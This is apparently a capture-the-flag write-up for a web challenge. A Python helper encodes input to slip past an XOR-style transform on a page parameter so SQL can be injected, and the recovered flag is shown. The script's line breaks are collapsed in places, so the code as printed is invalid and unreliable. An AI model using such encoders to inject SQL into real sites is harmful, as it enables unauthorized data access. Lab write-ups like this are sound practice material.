- **Challenge description**: Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.
- **Challenge category**: Web
- **Challenge points**: 250

### Solution

When first starting a web challenge, I personally like to make sure none of the very obvious attacks, the 'robots.txt' and 'inspect' attacks work, so just made sure that one was clear.

After messing a bit with the challenge I noticed that it has a weird XORing to the website page parameter
So wrote this little script:
```python
def create_payload(payload: str): 
	new_payload = [] for c in payload: 
		if ord(c) > 64:
			new_payload.append(ord(c) - 64)
		else:
			new_payload.append(0x40 + ord(c)) return '0' + ''.join('{:02x}'.format(x) for x in new_payload)
```

and then encoded this nice payload :D

```sql
SELECT * FROM pages WHERE page LIKE "%{input}"
```

and we got the flag!

flag{SQL-1nj3ct10n-thrU-x0r}